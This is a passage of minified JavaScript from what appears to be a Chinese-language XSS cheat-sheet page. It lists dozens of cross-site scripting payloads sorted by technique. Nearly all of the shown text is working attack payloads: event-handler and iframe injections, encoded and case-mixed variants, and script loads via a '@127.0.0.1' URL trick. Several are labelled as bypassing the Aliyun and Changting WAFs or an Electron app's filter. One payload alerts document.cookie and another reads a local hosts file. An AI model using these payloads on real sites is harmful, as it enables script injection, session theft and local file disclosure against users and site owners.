\u901A\u7528\u6027\u4E00\u81F4\uFF0C\u7528\u4E8E \u6807\u7B7E\u5185\u5C5E\u6027 \u3011",tag:[e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <script>".concat(D,"</script>  "),tag:[e.\u8F83\u5E38\u89C4]},{name:"  <script src='https://www.baidu.com' onload=print(1) ></script>  ",tag:[e.\u8F83\u5E38\u89C4]},{name:"  <script src='x:x' onerror=print(1)></script>  ",tag:[e.\u8F83\u5E38\u89C4]},{name:"  <img src='' onerror='".concat(D,"'>  "),desc:"\u3010\u6240\u6709\u7684<img>\uFF0C\u90FD\u662F\u53EF\u4EE5\u5D4C\u5165 <p>\u3001<span> \u4E2D\u7684\uFF0C\u8FD9\u662F\u5B83\u5F97\u5929\u72EC\u539A\u7684\u4F18\u52BF\u3011",tag:[e.\u8F83\u5E38\u89C4,e["<img>\u7684\u3010src\u3011"]]},{name:`  <img src='/' =_=" title="onerror='print(1)'">  `,tag:[e.\u8F83\u5E38\u89C4,e["<img>\u7684\u3010src\u3011"]]},{name:"  <svg><animate onbegin='print()' attributeName='x'></svg>  ",tag:[e.\u8F83\u5E38\u89C4]},{name:"  <details open ontoggle='print(1)'>  ",desc:"\u3010\u6709\u65F6\uFF0C\u53EF\u4EE5\u4E0D\u7528\u53F3\u95ED\u5408\u3011",tag:[e.\u8F83\u5E38\u89C4,e["\u65B0 \u6807\u7B7E"]]},{name:"  <iframe srcdoc='<svg onload=print(4);>'>  ",tag:[e.\u8F83\u5E38\u89C4,e["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe srcdoc='<img src=x:x onerror=print(1)>' ></iframe>  ",desc:"\u3010\u6765\u81EA\u4E4C\u4E91\u3011",tag:[e.\u8F83\u5E38\u89C4,e["<img>\u7684\u3010src\u3011"],e["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe srcdoc='<img src=x:x onerror=print(document.domain)>' ></iframe>  ",tag:[e.\u8F83\u5E38\u89C4,e["<img>\u7684\u3010src\u3011"],e["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe src='".concat(d,"'>  "),tag:[e.\u8F83\u5E38\u89C4,e["<iframe>\u7684\u3010src\u3011"]]},{name:"  <embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+' type='image/svg+xml' AllowScriptAccess='always'></embed>  ",tag:[e.\u8F83\u5E38\u89C4,e["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],e["<embed>\u7684\u3010src\u3011"]]},{name:"  <video src='https://www.w3cschool.cn/statics/demosource/mov_bbb.mp4' controls oncanplay=print(1)>  ",desc:"\u3010oncanplay\uFF0C\u662F\u6BD4\u8F83\u65B0\u7684\u4E8B\u4EF6\u3011",tag:[e.\u8F83\u5E38\u89C4,e["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:'  <iframe src="'.concat(d,';"<  '),tag:[e.\u5F88\u5947\u8469,e["<iframe>\u7684\u3010src\u3011"]]},{name:'  <iframe src="'.concat(d,';" //  '),tag:[e.\u5F88\u5947\u8469,e["<iframe>\u7684\u3010src\u3011"]]},{name:"  <iframe src=''/srcdoc='<svg onload=print(1)>'>  ",tag:[e.\u5F88\u5947\u8469,e["<iframe>\u7684\u3010src\u3011"],e["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:'  /*iframe/src*/<iframe/src="<iframe/src=@"/onload=print(1) /*iframe/src*/>  ',tag:[e.\u5F88\u5947\u8469,e["<iframe>\u7684\u3010src\u3011"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//  ",desc:"\u3010\u65E0\u5927\u4E2D\u5C0F\u62EC\u53F7\u3001\u65E0javascript\u3011\u2014\u2014\u3010\u53CD\u5F15\u53F7\uFF0C\u53EF\u6362\u6210 \u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3011",tag:[e.\u5F88\u5947\u8469,e.UrlEncode\u8DEF\u5F84\u7F16\u7801,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <img src='1' alt='al' lang='ert' onerror=top[alt+lang](0)>  ",tag:[e.\u5F88\u5947\u8469,e["<img>\u7684\u3010src\u3011"]]},{name:"  <input type='image' src onerror='print(1)'>  ",tag:[e.\u5F88\u5947\u8469]},{name:"  <input type='image' src='xxx' onerror%0A='print(1)'>  ",tag:[e.\u5F88\u5947\u8469]},{name:"  <script x> print(1) </script 1=2  ",tag:[e.\u5F88\u5947\u8469]},{name:"  <script ~~~>print(1)</script ~~~>  ",tag:[e.\u5F88\u5947\u8469]},{name:"  <script>$=1,\\u0061lert($)</script>  ",tag:[e.\u5F88\u5947\u8469,e["Unicode \u4E07\u56FD\u7801"]]},{name:"  <!--                 jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>>  ",desc:["-->       \u3010\u7528\u4E8E\u5904\u7406HTML\u6CE8\u91CA\u76F8\u5173\u3011",j.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[e.\u5F88\u5947\u8469,e.\u6CE8\u91CA,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:'  <input type="text" value=" jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>> "></input>  ',desc:[j.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"<input> \u7684onclick\u4E8B\u4EF6"),j.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[e.\u5F88\u5947\u8469,e.\u6CE8\u91CA,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <input type=text value=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>>></input>  ",desc:[j.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"<input> \u7684onclick\u4E8B\u4EF6"),j.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[e.\u5F88\u5947\u8469,e.\u6CE8\u91CA,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <embed src='".concat(d,"'/>  "),desc:"\u4EC5FireFox\u53EF\u4EE5\uFF1A",tag:[e.\u4E2D\u53EF\u9760,e["\u65B0 \u6807\u7B7E"],e["<embed>\u7684\u3010src\u3011"]]},{name:"  <img src='".concat(d,"'></img>  "),desc:"\u6700\u65B0\u4E24\u6D4F\u89C8\u5668\u7686\u4E0D\u53EF\uFF1A",tag:[e.\u4E2D\u53EF\u9760]},{name:"  <img DYNSRC='".concat(d,"'>  "),desc:"\u6700\u65B0\u4E24\u6D4F\u89C8\u5668\u7686\u4E0D\u53EF\uFF1A",tag:[e.\u4E2D\u53EF\u9760]},{name:"  <vmlframe xmlns='urn:schemas-microsoft-com:vml' style='behavior:url(#default#vml);position:absolute;width:100%;height:100%' src='http://itsokla.duapp.com/shouzi.vml#xss'></vmlframe>  ",desc:[j.a.createElement("div",null,"\u9002\u7528\u4E8E\u65E9\u671F\u7684\u3010IE\u6D4F\u89C8\u5668\u3011 ",Object(s.c)("\u7C7B\u4F3C\u4E8E<canvas>\u4E00\u6837\u7684\u6807\u7B7E"))],tag:[e.\u4E2D\u53EF\u9760]},{name:"  <img src='' style='test:expression(".concat(D,"):'>  "),desc:"\u3010IE7\u53CA\u4EE5\u524D\u3011\uFF1A",tag:[e.\u4F4E\u53EF\u9760]},{name:"  <ImG src='' ONErROr='print(1)'>  ",desc:"",tag:[e.\u5927\u5C0F\u5199\u654F\u611F]},{name:"  <IMG src='' ONERROR='print(1)'>  ",desc:"",tag:[e.\u5927\u5C0F\u5199\u654F\u611F]},{name:'  <svg/onload=location="javascript:print%20%281%29">  ',tag:[e.UrlEncode\u8DEF\u5F84\u7F16\u7801,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />  ",tag:[e["Unicode \u4E07\u56FD\u7801"],e["<img>\u7684\u3010src\u3011"]]},{name:"  <img src onerror=\\u{61}\\u{6C}\\u{65}\\u{72}\\u{74}(1) />  ",tag:[e["Unicode \u4E07\u56FD\u7801"],e["<img>\u7684\u3010src\u3011"]]},{name:"  <svg><script>print&#00000000000040;1&#x0000000000029;</script></svg>  ",tag:[e["Unicode \u4E07\u56FD\u7801"]]},{name:"  <script src='https:&#x2f;&#x2f;www.segmentfault.com@127.0.0.1:20443&#x2f;test.js'></script>  ",tag:[e["Unicode \u4E07\u56FD\u7801"]]},{name:`  "'><svg/onload=location="https:&#x2f;&#x2f;www.segmentfault.com@127.0.0.1:20443&#x2f;test.js"//  `,tag:[e["Unicode \u4E07\u56FD\u7801"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><svg/onload=print&lpar;1&rpar;//  `,tag:[e.HTML\u5B9E\u4F53\u5316\u7F16\u7801,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><svg/onload=location="https:&sol;&sol;www.segmentfault.com@127.0.0.1:20443&sol;test.js"//  `,tag:[e.HTML\u5B9E\u4F53\u5316\u7F16\u7801,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <a href='data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+'>click me</a>  ",tag:[e["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],e["<a>\u7684\u3010href\u3011"],e["<a>\u6807\u7B7E"]]},{name:`<math>
  <maction xlink:href='javascript:`.concat(D,`'>hello world</maction>
</math>`),tag:[e["\u65B0 \u6807\u7B7E"]]},{name:"  onpageshow  ",desc:"\u3010<body>\u6807\u7B7E\uFF0C\u7684\u65B0\u4E8B\u4EF6\u3011",tag:[e["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:'  <SCRIPT SRC="HTTPS://127.0.0.1:20443/TEST.JS"></SCRIPT>  ',tag:[e["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"]]},{name:'  <\u017Fcript src="https://127.0.0.1:20443/test.js"></script>  ',tag:[e["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"]]},{name:"  <a href='javas%0acript:print()'>  ",desc:"\u4E2D\u95F4\u3010%0a\u3011\u662F\u6362\u884C\u7B26",tag:[e.\u6362\u884C\u7B26,e["<a>\u7684\u3010href\u3011"],e["<a>\u6807\u7B7E"]]},{name:`  </style%0a>"'><svg/onload=print(1)//  `,desc:"\u4E2D\u95F4\u3010%0a\u3011\u662F\u6362\u884C\u7B26",tag:[e.\u6362\u884C\u7B26,e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"--!><svg><script>print&#00000000000040;1&#x0000000000029;</script>",tag:[e.\u6CE8\u91CA,e["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:'<img src="xxx" onerror="print(1)"',tag:[e["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"]]},{name:`  "'><svg/onload=location="https://www.segmentfault.com@127.0.0.1:20443/test.js"//  `,desc:["\u4EC5 FireFox \u53EF\u4EE5"],tag:[e["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"],e["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <script src='https://www.segmentfault.com@127.0.0.1:20443/test.js'></script>  ",desc:["\u4EC5 FireFox \u53EF\u4EE5"],tag:[e["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"]]},{name:'SCRIPT SRC="HTTPS://WWW.SEGMENTFAULT.COM@127.0.0.1:20443/TEST.JS"></SCRIPT><',tag:[e.URL\u5927\u5C0F\u5199]},{name:'  <img src="x" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>  ',tag:[e["Unicode \u4E07\u56FD\u7801"]]},{name:`<script>
<!--  11233123
  <!-- 123123
print(1)
  -->123
</script>`,tag:[e.\u6CE8\u91CA]},{name:`<script>
  var url = 'javascript:console.log("\\");print(1)\\/\\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>`,tag:[e["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]]},{name:'<script>console.log("\\\\");print(1)//");</script>',tag:[e["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]]},{name:"  onerror=print;throw'XSS'  ",desc:[A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["()"]]},{name:"  throw onerror = print, 'some string', 123, 'haha'  ",desc:[A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["()"],e[";"]]},{name:"  {onerror=print}throw 1  ",desc:[A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["()"],e[";"],e[","]]},{name:"  onerror=eval;throw'=print\\x281\\x29'  ",desc:[A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["ASCII \u7F8E\u56FD\u7801"],e["()"]]},{name:"{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'print\\x281\\x29'}",desc:["FireFox\u4E13\u7528",A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["ASCII \u7F8E\u56FD\u7801"],e["()"],e[";"]]},{name:"eval( 8680439..toString(30) )",desc:["\u539F\u7406\uFF1A\u3010800..\u3011\u7684\u6548\u679C\uFF0C\u548C\u3010 (800) \u3011\u6548\u679C\u4E00\u81F4\u3002  \u53C2\u8003\u8D44\u6599\uFF1Ahttps://stackoverflow.com/a/4211641/6264260",A,"\u5173\u4E8EError\u62A5\u9519\u7684\u8FD9\u5757\uFF0C\u8FD8\u6CA1\u6709\u6B63\u5F0F\u8BD5\u9A8C\u8FC7"],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e["."]]},{name:'  window.open("https://www\u3002baidu\u3002com")  ',desc:["\u4F7F\u7528\u3010\u3002\u4E2D\u6587\u70B9\u53F7\u3011\u2014\u2014\u2014\u2014\u7ED5\u8FC7\u3010.\u82F1\u6587\u70B9\u53F7\u3011\u2014\u2014\u2014\u2014\u6765\u5E94\u5BF9 IP/\u57DF\u540D"],tag:[e["."]]},{name:"  throw/a/,a=URL+0,g=print,onerror=eval,{lineNumber:1,columnNumber:1,fileName:0,message:0+/1/g+a[12]+[1337,331,337]+a[13]}  ",desc:["FireFox\u4E13\u7528","\u907F\u514D\u4E86\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u7684\u4F7F\u7528",A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"],e.\u5B57\u7B26\u4E32\u53D8\u91CF]},{name:"  TypeError.prototype.name='=/',0[onerror=eval]['/-print(1)//']  ",desc:["\u907F\u514D\u4E86\u3010throw\u3011\u5173\u952E\u5B57\u7684\u4F7F\u7528",A],tag:[e.eval\u76F8\u5173,e["error\u62A5\u9519\u3001Exception\u62A5\u9519"]]},{name:'"&ss=aaaa\\"+"&from==1;function/**/from(){}',desc:[j.a.createElement(j.a.Fragment,null,"\u3010from\u3011\u53D8\u91CF\u88AB\u63D0\u524D\u4F7F\u7528 ",Object(s.c)("\u6216\u8005\uFF0C\u672C\u6765\u5C31\u65E0\u3010\u6B64\u53D8\u91CF\u3011")),"\u3010function\u58F0\u660E\u3011\uFF0C\u53EF\u4EE5\u5C06\u81EA\u5DF1\u3010\u524D\u7F6E\u3011","\u4F7F\u7528\u3010/**/\u3011\u4EE3\u66FF\u4E86\uFF0C\u5FC5\u9700\u8981\u7684 \u7A7A\u683C"],tag:[e["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],e["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],e.\u6CE8\u91CA]},{name:`<script>
// \u7B2C\u4E00\u79CD
document.getElementsByTagName("div")[0].innerHTML="<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />";

// \u7B2C\u4E8C\u79CD
eval ("\\u0061\\u006C\\u0065\\u0072\\u0074(1)")

// \u7B2C\u4E09\u79CD
\\u0061\\u006C\\u0065\\u0072\\u0074(1)
</script>`,desc:[j.a.createElement("div",null,"\u4EE5\u4E0A3\u79CD\u65B9\u5F0F\uFF0C\u90FD\u662F\u53EF\u4EE5\u8FD0\u884C\u7684\u3002 ",Object(s.c)("\u826F\u597D\u7684\u4F8B\u8BC1\uFF01"),j.a.createElement("ol",null,j.a.createElement("li",null,"\u3010js\u89E6\u53D1html\u6E32\u67D3\u3011\u3001\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u3001\u3010\u5757\u7EA7JS\u4EE3\u7801\u5185\u3011\uFF0C\u90FD\u662F\u53EF\u4EE5\u7684\u3002")))],tag:[e["Unicode \u4E07\u56FD\u7801"]]},{name:"  <script src='data:,print(1)'></script>  ",desc:["\u867D\u6CA1\u6709 base64\u7F16\u7801 \uFF0C\u4F46\u4ECD\u7136\u80FD\u591F\u6267\u884C\u3002"],tag:[e["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],e["<script>\u7684\u3010src\u3011"]]},{name:"<svg\fonload=print(1)>",desc:[j.a.createElement("div",null,e["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],"\u3011")],tag:[e["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],e.\u6362\u9875\u7B26,e["ASCII \u7F8E\u56FD\u7801"]]},{name:" <a href='javascript:print(1)'>123</a> ",desc:["\u6BD4\u8F83\u7279\u522B\u7684\u4E00\u70B9\u662F\uFF0C\u5E38\u5E38\u53EF\u4EE5\u652F\u6301\u3010MarkDown\u8BED\u6CD5\u3011\u3002"],tag:[e.\u8F83\u5E38\u89C4,e["<a>\u7684\u3010href\u3011"],e["<a>\u6807\u7B7E"]]},{name:" <iframe src='file://c:/windows/system32/drivers/etc/hosts' onload='alert(iframe.contentDocument.body.innerHTML)' id='iframe'> ",desc:["\u9002\u5408\u5728\u3010Electron\u5E94\u7528\u3011\u4E2D\uFF0CXSS\u7684\u573A\u666F\u3002\uFF08\u6709\u65F6\u80FD\u76F4\u63A5\u5524\u8D77\u672C\u5730\uFF09","\u4F46\u4E5F\u6709\u53EF\u80FD\u9047\u5230\u3010Not allowed to load local resource: <URL>\u3011\u7684\u9519\u8BEF\u3002","\u4FEE\u590D\u65E5\u671F\uFF1A2018\u5E749\u6708September\u3002"],tag:[e.\u5F88\u5947\u8469,e["<iframe>\u7684\u3010src\u3011"],e.\u57FA\u672CElectron\u8BED\u53E5]},{name:`/*iframe/src*/<iframe/src="<iframe/src=@"/onload=print(1) /*iframe/src*/><form id='document' name='body'><input name='innerHTML'><video src='https://www.w3cschool.cn/statics/demosource/mov_bbb.mp4' controls oncanplay=print(1)>`,desc:["1.\u66FE\u7ECF\u653B\u7834\u4E86\uFF0CElectron\u5E94\u7528\uFF0C\u3010Laverna\u3011\u7684\u3010XSS Filter\u3011\u3002\u662F\u975E\u5E38\u4E0D\u9519\u7684\u6210\u5C31\uFF01\uFF01\uFF01","2.\u4F7F\u7528\u4E86\u3010DOM\u963B\u585E\u5668\u3011 \uFF08\u4F46\u6B64\u5904\uFF0C\u4F3C\u4E4E\u5E76\u6CA1\u6709\u8D77\u5230\u4F5C\u7528\u3002\u5D4C\u5957\u8D77\u5230\u4E86\u4F5C\u7528\uFF09"],tag:[e.DOM\u963B\u585E\u5668,e["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"],e.\u57FA\u672CElectron\u8BED\u53E5,e["<iframe>\u7684\u3010src\u3011"],e["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"],e["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:"[\u6587\u5B57](javascript:print(1))",desc:["\u7F51\u9875\u8DEF\u5F84\u94FE\u63A5"],tag:[e.MarkDown\u8D85\u94FE\u63A5]},{name:'![\u5934\u50CF]("onerror="print(1))',desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u5931\u8D25\u7684\u573A\u666F"],tag:[e.MarkDown\u8D85\u94FE\u63A5]},{name:`![\u5934\u50CF](https://www.w3schools.com/images/driveicon.png"onload="alert('XSS'))`,desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u6210\u529F\u7684\u573A\u666F"],tag:[e.MarkDown\u8D85\u94FE\u63A5]},{name:'![\u5934\u50CF" onload=alert(1);//](https://www.w3schools.com/images/driveicon.png)',desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u6210\u529F\u7684\u573A\u666F","\u8C03\u6362\u4E86\u8BED\u5E8F"],tag:[e.MarkDown\u8D85\u94FE\u63A5]},{name:"  <img src=# onerror=print`2`>  ",desc:[j.a.createElement(j.a.Fragment,null,"\u57FA\u672C\u53C2\u8003\u8D44\u6599\uFF1A",b("\u7ED5\u8FC7\u963F\u91CC\u4E91\u76FE\u8FDB\u884CXSS-\u963F\u91CC\u4E91\u5F00\u53D1\u8005\u793E\u533A","https://developer.aliyun.com/article/519334"))],tag:[e["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:'  ">--!><svg> <img src=# onerror=alert`2`>  ',desc:[j.a.createElement(j.a.Fragment,null,"\u662F\u4E0A\u8FF0\u7684\u589E\u5F3A\u7248\uFF01")],tag:[e["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:"site:a=<script>/**/alert(111)//",desc:[j.a.createElement(j.a.Fragment,null,"\u5728\u3010\u767E\u5EA6Baidu\u3011\u641C\u7D22\u5F15\u64CE\uFF0C\u76F4\u63A5\u8F93\u5165\u89E6\u53D1\u4E86\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF1F\uFF1F\uFF1F"),j.a.createElement(j.a.Fragment,null,j.a.createElement("a",{href:"https://www.baidu.com/s?wd=site%3Aa%3D%3Cscript%3E%2F**%2Falert%28%60%E6%88%91%E5%8F%AB%E5%9C%9F%E8%B1%86%E8%B1%86%2C%E6%88%91%E4%BB%8A%E5%B9%B4%E4%B8%89%E5%B2%81%E4%BA%86%60%29%2F%2F",target:"_blank",rel:"noreferrer"},"\u70B9\u51FB\u793A\u8303")),j.a.createElement(j.a.Fragment,null,"\u7C7B\u4F3C\u7684\u8FD8\u6709 ",j.a.createElement("pre",null,"site:a=<script>/**/alert(`\u6211\u53EB\u571F\u8C46\u8C46\uFF0C\u4ECA\u5E74\u4E09\u5C81\u4E86`)//"))],tag:[e["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]}],E.options=[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u6309\u9636\u6BB5)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e["1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF"])),{},{children:[Object(t.a)({},Object(s.a)(e.\u5168\u77E5\u5168\u80FD\u5168\u5584)),Object(t.a)({},Object(s.a)(e.\u7231\u56FD\u9752\u5E74)),Object(t.a)({},Object(s.a)(e["123<br>321"],[Object(s.c)("\u76F8\u5BF9\u800C\u8A00\uFF0C\u6BD4<img>\u66F4\u52A0\u9690\u853D\u4E00\u70B9")]))]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"])),{},{children:[]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5"])),{},{children:[Object(t.a)({},Object(s.a)(e["\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011"]))]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664"])),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.html\u4E8B\u4EF6)),{},{children:[Object(t.a)({},Object(s.a)(e.\u6F0F\u6389\u7684\u4E8B\u4EF6)),Object(s.d)(e["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"],e.HTML5)]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["\u3010src\u3011(\u5305\u62EChref)"],["src\u7684\u5F15\u7528\u8D44\u6E90\u7684\uFF0C\u4E00\u822C\u4E0D\u4F1A\u5C4F\u853D\u6389\u3002\u2014\u2014\u2014\u2014WAF",j.a.createElement("div",null,"\u4E00\u822C\u5229\u7528\u65B9\u5F0F\uFF1A",j.a.createElement("ol",null,j.a.createElement("li",null,"\u2460 javascript\u534F\u8BAE"),j.a.createElement("li",null,"\u2461 DataUrl\u534F\u8BAE"),j.a.createElement("li",null,"\u2462 \u5185\u5D4C\uFF1A\u5176\u5B83\u6807\u7B7E")))])),{},{children:[Object(t.a)({},Object(s.a)(e["<img>\u7684\u3010src\u3011"])),Object(t.a)({},Object(s.a)(e["<iframe>\u7684\u3010src\u3011"])),Object(t.a)({},Object(s.a)(e["<iframe>\u7684\u3010srcdoc\u3011"])),Object(t.a)({},Object(s.a)(e["<embed>\u7684\u3010src\u3011"])),Object(t.a)({},Object(s.a)(e["<a>\u7684\u3010href\u3011"])),Object(t.a)({},Object(s.a)(e["<script>\u7684\u3010src\u3011"],[j.a.createElement("div",null,Object(s.c)("\u8FD9\u4E2A\uFF0C\u4F7F\u7528\u7684\u6BD4\u8F83\u5C11"))]))]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5"])),{},{children:[Object(t.a)({},Object(s.a)(e["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"]))]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e["5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9"])),{},{children:[Object(t.a)({},Object(s.a)(e["<a>\u6807\u7B7E"],["\u7ECF\u8FC7\u8001\u5E08\u7684\u7ECF\u9A8C\uFF0C\u8BD5\u8FC7\u5F88\u591A\u7F51\u7AD9\uFF0C\u3010<a>\u3011\u6807\u7B7E\u7ED5\u8FC7\u7684\u6982\u7387\uFF0C\u90FD\u662F\u5F88\u5927\u7684\u3002"]))]})]}),Object(t.a)(Object(t.a)({},Object(s.a)(e.\u6309\u573A\u666F)),{},{children:[Object(t.a)(Object(t.a)({},Object(s.a)(e.\u7EAFHTML\u5185,[j.a.createElement("div",null,v.\u6982\u5FF5,j.a.createElement("ol",null,j.a.createElement("li",null,"\u3010\u6807\u7B7E\u540D\u3011\uFF1A\u6807\u7B7E\u7684\u540D\u5B57"),j.a.createElement("li",null,"\u3010\u95ED\u5408\u3011\uFF1A\u4E24\u4FA7\u7684\u5C16\u62EC\u53F7"),j.a.createElement("li",null,"\u3010innerHTML\u3011\uFF1A\u5C5E\u6027\u540D"),j.a.createElement("li",null,"\u3